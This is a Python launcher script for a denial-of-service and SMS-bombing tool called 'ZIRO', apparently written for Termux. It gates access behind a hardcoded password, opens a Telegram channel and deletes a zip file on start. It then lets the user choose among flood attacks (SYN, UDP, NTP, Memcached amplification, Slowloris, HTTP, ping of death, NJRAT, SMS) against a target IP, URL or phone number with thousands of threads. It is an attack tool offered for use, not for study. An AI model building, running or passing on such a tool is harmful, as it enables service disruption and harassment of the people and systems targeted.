import os, time
os.system('rm -rf 2.zip')
os.system("xdg-open https://t.me/kurdkurd1234")
time.sleep(3)
os.system("clear")
try:
    import sys
    os.system("pkg install figlet -y")
    time.sleep(2)
    print("\x1b[1;96m-\x1b[1;90m>-")
    os.system('clear')
    while True:
        os.system('clear')
        os.system("figlet ZIRO")		
        print("rawasta")
        time.sleep(1.9)
        print("\033[1;30;40m User u Pass Bnusa")
        aa="ziro"
        bb="py"
        
        x=input("  Username : ")
        xx=input("  Password : ")
        
        if x == aa and xx == bb :
            print("boayawa")
            

            def hhh(z):
                for e in z + '\n':
                    sys.stdout.write(e)
                    sys.stdout.flush()
                    time.sleep(0.05)


            os.system("printf '\033]5;ZIRO \a'")
            print("\x1b[1;96m-\x1b[1;93m>-")
            os.system("clear")
            os.system("figlet ZIRO")
             
            print('  \033[1;30;40m @XZIRO12')
            print('AUTHOR: ZIRO')
            print('\033[1;30;40m-------------------------\033[0m')

            import argparse
            import sys
            import signal

            def signal_handler(signal, frame):
                A = ''
                W = ''
                E = ''
                print(A+'\n[!]'+W+' Attack terminated.'+E)
                os._exit(0)


            def main():
                parser = argparse.ArgumentParser()
                parser.add_argument("--target", type = str, metavar = "<ip:port/URL3/phone>",
                                help = "Target IP and port, URL or phone.")
                parser.add_argument("--tool", type = str, metavar = "[SMS|NTP|TCP|UDP|SYN|POD|SLOWLORIS|MEMCACHED|HTTP|NJRAT]",
                                help = "Attack tool.")
                parser.add_argument("--timeout", type = int, default = 10, metavar = "<timeout>",
                                help = 'Timeout in seconds.')
                parser.add_argument("--threads", type = int, default = 3, metavar = "<threads>",
                                help = "Threads count.")
                parser.add_argument("-u", "--update", action='store_true', dest="update", help = "Update ZIRO.")
                parser.add_argument("--version", action='store_true', dest="version", help = "Show ZIRO version.")
                
                print("\033[1;31;40m-------------------------\033[0m")

                print("   \033[1;31;40m1.raqam")
                print("   2.sait")
                print("   3.TCP")
                print("\033[1;31;40m-------------------------\033[0m")
                args = parser.parse_args()
                threads = 9999
                time = 999
                method = (input("\x1b[1;36;40m halbzhera :  \x1b[1;97m"))
                target = input("\x1b[1;36;40m hersh dakaya sar ke : \x1b[1;97m")
                hhh(' chawareba...........')
                hhh("=========================")
                if method == "NTP":
                    signal.signal(signal.SIGINT, signal_handler)
                    import tools.addons.clean
                    import tools.addons.logo
                    from tools.other.ntp import NTP_ATTACK
                    NTP_ATTACK(threads, time, target)
                    
                elif args.update:
                    os.system("chmod +x bin/quack && bin/quack -u")
                    sys.exit()

                elif args.version:
                    print("")
                    os.system("cat banner/banner.txt")
                    print("")
                    print("ZIRO v2.0")
                    sys.exit()

                elif method == "SYN":
                    signal.signal(signal.SIGINT, signal_handler)
                    import tools.addons.clean
                    import tools.addons.logo
                    from tools.other.syn import SYN_ATTACK
                    SYN_ATTACK(threads, time, target)

                elif method == "3":
                    signal.signal(signal.SIGINT, signal_handler)
                    import tools.addons.clean
                    import tools.addons.logo
                    from tools.other.tcp import TCP_ATTACK
                    TCP_ATTACK(threads, time, target)

                elif method == "POD":
                    signal.signal(signal.SIGINT, signal_handler)
                    import tools.addons.clean
                    import tools.addons.logo
                    from tools.other.pod import POD_ATTACK
                    POD_ATTACK(threads, time, target)

                elif method == "NJRAT":
                    signal.signal(signal.SIGINT, signal_handler)
                    import tools.addons.clean
                    import tools.addons.logo
                    from tools.other.njrat import NJRAT_ATTACK
                    NJRAT_ATTACK(threads, time, target)

                elif method == "UDP":
                    signal.signal(signal.SIGINT, signal_handler)
                    import tools.addons.clean
                    import tools.addons.logo
                    from tools.other.udp import UDP_ATTACK
                    UDP_ATTACK(threads, time, target)

                elif method == "2":
                    signal.signal(signal.SIGINT, signal_handler)
                    import tools.addons.clean
                    import tools.addons.logo
                    from tools.other.http import HTTP_ATTACK
                    HTTP_ATTACK(threads, time, target)

                elif method == "SLOWLORIS":
                    signal.signal(signal.SIGINT, signal_handler)
                    import tools.addons.clean
                    import tools.addons.logo
                    from tools.other.slowloris import SLOWLORIS_ATTACK
                    SLOWLORIS_ATTACK(threads, time, target)
                
                elif method == "MEMCACHED":
                    signal.signal(signal.SIGINT, signal_handler)
                    import tools.addons.clean
                    import tools.addons.logo
                    from tools.other.memcached import MEMCACHED_ATTACK
                    MEMCACHED_ATTACK(threads, time, target)

                elif method == "1":
                    signal.signal(signal.SIGINT, signal_handler)
                    import tools.addons.clean
                    import tools.addons.logo
                    from tools.SMS.main import SMS_ATTACK
                    SMS_ATTACK(threads, time, target)

                else:
                    parser.print_help()

            if __name__ == '__main__':
                main()

        else:
            print("---------------------------")
            print("pass halaya")
except:
	    os.system("clear")
	    os.system("pip install phonenumbers")
	    os.system("pip install requests")
	    os.system("pip install scapy")
	    os.system("pip install wget")
	    os.system("pip install argparse")
	    os.system("pip install telethon")
	    os.system("python ziro.py")
